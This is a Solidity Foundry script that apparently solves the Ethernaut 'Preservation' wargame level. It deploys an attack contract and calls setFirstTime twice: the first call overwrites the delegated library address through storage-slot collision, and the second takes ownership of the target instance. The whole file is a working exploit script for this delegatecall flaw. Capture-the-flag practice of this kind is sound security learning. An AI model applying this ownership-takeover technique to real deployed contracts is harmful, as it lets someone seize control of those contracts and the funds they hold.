//SPDX-License-Identifier: MIT

pragma solidity ^0.8.24;

import {Script, console} from "forge-std/Script.sol";
import {Preservation} from "../src/PreServation.sol";
import {AttackLibraryContract} from "../src/AttackLibrarycontract.sol";

contract AttackLibraryContractScript is Script {
    address instance = 0x9b6BCF0C81Db93c4a38e5723d98dAb94e61D1b7F;
    Preservation preservation;
    AttackLibraryContract attack;

    function run() external {
        preservation = Preservation(instance);

        vm.startBroadcast();
        attack = new AttackLibraryContract();

        uint256 t1 = uint256(uint160(address(attack)));
        preservation.setFirstTime(t1);

        uint256 player = uint256(uint160(address(msg.sender)));
        preservation.setFirstTime(player);
        vm.stopBroadcast();

        console.log("Owner: ", preservation.owner());
    }
}
